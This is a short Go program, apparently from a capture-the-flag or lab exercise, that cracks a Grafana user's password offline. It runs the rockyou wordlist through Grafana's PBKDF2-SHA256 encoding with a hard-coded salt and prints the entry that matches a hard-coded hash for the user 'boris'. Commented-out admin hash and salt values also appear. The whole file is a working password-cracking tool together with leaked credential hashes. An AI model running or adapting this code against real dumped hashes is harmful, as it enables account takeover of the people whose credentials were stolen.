package main

import (
	"fmt"
 //	"crypto/rand"
	"crypto/sha256"
//	"errors"
	"encoding/hex"
//	"mime/quotedprintable"
	"golang.org/x/crypto/pbkdf2"
    	"os"
    	"bufio"
)

func main () {
	//random_hex_admin := "hLLY6QQ4Y6"
	//salt_admin := "YObSoLj55S"
	//admin_hash := "7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8"
	//random_hex_boris := "mYl941ma8w"
	salt_boris := "LCBhdtJWjl"
	boris_hash := "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
	
	file, err := os.Open("/usr/share/wordlists/rockyou.txt")
    	if err != nil {
        	fmt.Println(err)
    	}
    	defer file.Close()
 
    	scanner := bufio.NewScanner(file)
    	for scanner.Scan() {
        	password := scanner.Text()
		trial, err := EncodePassword(password , salt_boris)
		if err != nil {
			fmt.Println(err)
		}
		if trial == boris_hash {
			fmt.Println(password)
			os.Exit(1)
		}
    	}
 
  	if err := scanner.Err(); err != nil {
        	fmt.Println(err)
    	}
}

//From Grafana repository :  EncodePassword encodes a password using PBKDF2.
func EncodePassword(password string, salt string) (string, error) {
	newPasswd := pbkdf2.Key([]byte(password), []byte(salt), 10000, 50, sha256.New)
	return hex.EncodeToString(newPasswd), nil
}

